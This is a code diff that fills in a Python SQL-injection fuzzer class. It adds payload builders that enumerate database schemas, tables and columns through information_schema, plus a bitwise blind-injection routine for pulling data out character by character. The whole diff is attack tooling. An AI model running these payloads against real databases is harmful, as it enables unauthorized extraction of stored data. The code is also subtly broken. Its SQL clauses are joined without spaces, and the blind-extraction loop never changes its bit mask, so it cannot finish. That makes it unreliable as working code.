@@ -37,8 +37,54 @@ class SQLi(Fuzzer):
         for k in cls.specialChars:
             yield k
 
-    def timeInjection(self):
-        pass
+    @classmethod
+    def schemas(cls, bias=-1):
+        payload = "select distinct(SCHEMA_NAME) from information_schema.SCHEMATA"
+        if bias >= 0:
+            payload += "limit %s,1" % bias
+        return payload
 
-    def boolInjection(self):
-        pass
+    @classmethod
+    def tables(cls, schema="", bias=-1):
+        payload = "select distinct(TABLE_NAME) from information_schema.TABLES"
+        if schema:
+            payload += "where TABLE_SCHEMA='%s'" % schema
+        if bias >= 0:
+            payload += "limit %s,1" % bias
+        return payload
+
+    @classmethod
+    def columns(cls, schema="", table="", bias=-1):
+        payload = "select distinct(COLUMN_NAME) from information_schema.COLUMNS"
+        if schema:
+            payload += "where TABLE_SCHEMA='%s'" % schema
+        if table:
+            if schema:
+                payload += "and TABLE_NAME='%s'" % table
+            else:
+                payload += "where TABLE_NAME='%s'" % table
+        if bias >= 0:
+            payload += "limit %s,1" % bias
+        return payload
+
+    @classmethod
+    def sub(cls, payload, pos, mid):
+        return "(ascii(mid((%s),%s,1))&%d)" % (payload, pos, mid)
+
+    @classmethod
+    def blindInjection(cls, payload, length, func):
+        mid = 256
+        pos = 1
+        guess = 0
+        content = ''
+        while pos < length:
+            if mid == 0:
+                mid = 256
+                pos += 1
+                content += chr(guess)
+                print(content)
+                guess = 0
+            else:
+                guess <<= 1
+                guess += int(func())
+        return content
